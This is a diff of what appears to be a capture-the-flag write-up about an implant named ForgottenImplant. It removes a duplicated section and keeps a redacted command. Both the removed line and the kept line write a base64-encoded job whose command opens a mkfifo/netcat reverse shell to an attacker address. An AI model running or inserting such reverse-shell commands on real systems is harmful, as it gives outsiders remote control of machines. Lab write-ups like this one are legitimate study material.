@@ -109,16 +109,6 @@ xx.xxx.xx.xx - - [08/Sep/2025 xx:xx:xx] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2U
 :~/ForgottenImplant# mkdir get-job
 ```
 
-<h2>get-job</h2>
-
-```bash
-:~/ForgottenImplant# mkdir get-job
-```
-
-
-echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc 10.201.9.74 1234 >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
-
-
 ```bash
 :~/ForgottenImplant# echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc xx.xxx.xx.xx xxxx >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
 ```
